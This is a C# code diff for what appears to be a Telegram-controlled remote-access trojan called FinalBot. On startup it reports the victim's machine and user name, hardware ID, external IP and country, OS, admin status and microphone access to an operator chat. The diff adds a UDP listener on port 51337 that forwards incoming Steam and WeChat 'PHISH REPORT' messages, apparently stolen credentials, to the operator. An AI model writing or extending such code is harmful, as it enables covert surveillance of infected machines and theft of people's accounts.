@@ -7,8 +7,10 @@ using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
 using VanguardCore;
-using System.Diagnostics.CodeAnalysis;
 using System.Collections.Generic;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
 
 namespace FinalBot
 {
@@ -36,6 +38,9 @@ namespace FinalBot
         {
             Console.WriteLine("[ORCHESTRATOR] Starting services...");
             
+            // Start UDP listener for phishing reports (Steam/WeChat)
+            _ = Task.Run(() => StartUdpListener());
+
             // 1. Initial Report (via Telegram as fallback/sender)
             await SendStartupReport();
 
@@ -62,17 +67,18 @@ namespace FinalBot
 
         private async Task SendStartupReport()
         {
-            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
-            string extIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
+            var (ip, country, flag) = FinalBot.Modules.SystemInfoModule.GetCountryInfo();
             string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
-            string osVer = Environment.OSVersion.ToString();
+            string osName = FinalBot.Modules.SystemInfoModule.GetFriendlyOSName();
+            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
             string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";
 
             string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                           $"━━━━━━━━━━━━━━━━━━\n" +
-                          $"👤 <b>ID:</b> <code>{pcUser} ({hwid})</code>\n" +
-                          $"🌐 <b>IP:</b> <code>{extIp}</code>\n" +
-                          $"🖥️ <b>Система:</b> <code>{osVer}</code>\n" +
+                          $"👤 <b>ID:</b> <code>{pcUser}</code>\n" +
+                          $"🆔 <b>HWID:</b> <code>{hwid}</code>\n" +
+                          $"🌐 <b>IP:</b> <code>{ip}</code> | {flag} {country}\n" +
+                          $"🖥️ <b>Система:</b> <code>{osName}</code>\n" +
                           $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
                           $"🎤 <b>Микрофон:</b> ✅\n" +
                           $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
@@ -92,6 +98,34 @@ namespace FinalBot
                 );
             }
             catch { }
+        }
+
+        private async Task StartUdpListener()
+        {
+            int port = 51337;
+            try
+            {
+                using (var udpClient = new UdpClient(port))
+                {
+                    Console.WriteLine($"[UDP] Listening for reports on port {port}...");
+                    while (_isRunning)
+                    {
+                        var result = await udpClient.ReceiveAsync();
+                        string message = Encoding.UTF8.GetString(result.Buffer);
+                        Console.WriteLine($"[UDP] Message received: {message}");
+
+                        await _botClient.SendTextMessageAsync(
+                            chatId: _adminId,
+                            text: $"🎯 <b>PHISH REPORT</b>\n━━━━━━━━━━━━━━━━━━\n{message}\n━━━━━━━━━━━━━━━━━━",
+                            parseMode: ParseMode.Html
+                        );
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[UDP ERROR] {ex.Message}");
+            }
         }
 
         public void Stop()
